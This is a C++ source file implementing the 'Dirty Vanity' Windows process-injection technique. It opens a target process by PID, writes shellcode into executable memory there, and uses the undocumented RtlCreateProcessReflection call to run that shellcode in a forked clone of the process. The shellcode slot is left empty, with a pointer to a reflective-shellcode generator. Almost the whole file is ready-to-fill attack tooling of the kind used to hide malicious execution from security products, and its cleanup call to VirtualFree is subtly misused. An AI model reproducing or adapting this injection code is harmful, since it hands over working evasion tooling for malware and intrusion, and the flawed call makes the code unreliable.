/*
Title: Dirty Vanity
Resources:
	- https://github.com/deepinstinct/Dirty-Vanity
*/
#include <Windows.h>
#include <winternl.h>
#include "DirtyVanity.hpp"

_RtlCreateProcessReflection rtlCreateProcessReflection = nullptr;

VOID FreeAll(HMODULE hNtdll, HANDLE hProcess, LPVOID lpBaseAddr) {
	if (hNtdll)
		FreeLibrary(hNtdll);
	if (lpBaseAddr)
		VirtualFree(hProcess, lpBaseAddr, 0, MEM_RELEASE);
	if (hProcess)
		CloseHandle(hProcess);
}

BOOL InitFunctions(HMODULE hNtdll) {
	rtlCreateProcessReflection = reinterpret_cast<_RtlCreateProcessReflection>(GetProcAddress(hNtdll, "RtlCreateProcessReflection"));
	if (!rtlCreateProcessReflection) return FALSE;

	return TRUE;
}

BOOL DirtyVanity() {
	DWORD dwPid = 5068; // Replace it with the target PID.

	// Reflective shellcode is required. (https://github.com/monoxgas/sRDI)
	unsigned char shellcode[] = "";

	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll) return FALSE;
	if (!InitFunctions(hNtdll)) return FALSE;

	HANDLE hProcess = OpenProcess(
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
		TRUE,
		dwPid
	);
	if (!hProcess) return FALSE;

	// Write shellcode to the target process.
	LPVOID lpBaseAddr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpBaseAddr) {
		FreeAll(hNtdll, hProcess, nullptr);
		return FALSE;
	}
	SIZE_T dwBytesWritten = 0;
	if (!WriteProcessMemory(hProcess, lpBaseAddr, shellcode, sizeof(shellcode), &dwBytesWritten)) {
		FreeAll(hNtdll, hProcess, lpBaseAddr);
		return FALSE;
	}

	RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
	NTSTATUS status = rtlCreateProcessReflection(
		hProcess,
		RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
		lpBaseAddr,
		nullptr,
		nullptr,
		&info
	);
	if (!NT_SUCCESS(status)) {
		FreeAll(hNtdll, hProcess, lpBaseAddr);
		return FALSE;
	}

	FreeAll(hNtdll, hProcess, lpBaseAddr);

	return TRUE;
}
